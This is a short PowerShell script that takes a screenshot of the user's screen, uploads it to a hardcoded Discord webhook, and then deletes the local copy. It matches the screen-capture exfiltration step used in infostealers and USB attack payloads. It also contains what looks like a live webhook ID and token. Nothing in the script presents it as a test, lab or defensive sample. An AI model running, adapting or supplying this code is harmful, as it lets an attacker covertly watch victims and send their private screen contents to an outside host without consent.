# Define the path where the screenshot will be saved in the temp directory
$tempDir = [System.IO.Path]::GetTempPath()
$screenshotPath = [System.IO.Path]::Combine($tempDir, "screenshot.png")

# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1266038774689828966/1N__Dh0qQYEUM7GZ1wrdJ7tbahxGp1MI2IxGQuXsRAWI_9zeyLkbRWcCXBGT6o3sLiiF"

# Import the screenshot module
if (Test-Path .\Take-Screenshot.ps1) {
    . .\Take-Screenshot.ps1
} else {
    Write-Host "Take-Screenshot.ps1 not found."
    exit
}

# Take a screenshot
if (-not (Test-Path $screenshotPath)) {
    Take-Screenshot -Path $screenshotPath
}

# Load .NET HttpClient and related classes
Add-Type -AssemblyName "System.Net.Http"

# Create HttpClient instance
$httpClient = [System.Net.Http.HttpClient]::new()

# Prepare the multipart form data
$multipartContent = [System.Net.Http.MultipartFormDataContent]::new()

# Add text part
$textContent = [System.Net.Http.StringContent]::new("Here is the screenshot")
$dispositionHeader = [System.Net.Http.Headers.ContentDispositionHeaderValue]::new("form-data")
$dispositionHeader.Name = "content"
$textContent.Headers.ContentDisposition = $dispositionHeader
$multipartContent.Add($textContent)

# Add file part
$fileContent = [System.Net.Http.ByteArrayContent]::new([System.IO.File]::ReadAllBytes($screenshotPath))
$dispositionHeader = [System.Net.Http.Headers.ContentDispositionHeaderValue]::new("form-data")
$dispositionHeader.Name = "file"
$dispositionHeader.FileName = [System.IO.Path]::GetFileName($screenshotPath)
$fileContent.Headers.ContentDisposition = $dispositionHeader
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
$multipartContent.Add($fileContent)

# Send the request
$response = $httpClient.PostAsync($webhookUrl, $multipartContent).Result

# Check the response
if ($response.StatusCode -eq [System.Net.HttpStatusCode]::NoContent) {
    Write-Host "Screenshot uploaded successfully."
} else {
    Write-Host "Failed to upload screenshot. Status Code: $($response.StatusCode)"
}

# Optionally, remove the screenshot file after sending
if (Test-Path $screenshotPath) {
    Remove-Item -Path $screenshotPath -Force
}
